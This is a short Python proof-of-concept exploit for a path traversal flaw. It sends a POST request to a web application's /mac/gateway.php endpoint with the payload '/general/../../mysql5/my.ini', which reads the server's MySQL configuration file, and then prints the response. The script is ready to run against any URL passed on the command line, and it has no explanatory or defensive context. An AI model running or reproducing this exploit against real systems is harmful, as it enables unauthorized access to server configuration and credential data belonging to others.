import argparse
import requests


def run_poc(base_url):
    target_url = base_url + "/mac/gateway.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Encoding": "gzip"
    }
    data = {
        "json": '{"url":"/general/../../mysql5/my.ini"}'
    }

    try:
        response = requests.post(target_url, headers=headers, data=data)
        print("HTTP响应代码:", response.status_code)
        print("响应内容:")
        print(response.text)

    except Exception as e:
        print("发生异常:", str(e))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Path Traversal POC")
    parser.add_argument("-u", "--url", help="Base URL", required=True)
    args = parser.parse_args()

    base_url = args.url
    run_poc(base_url)
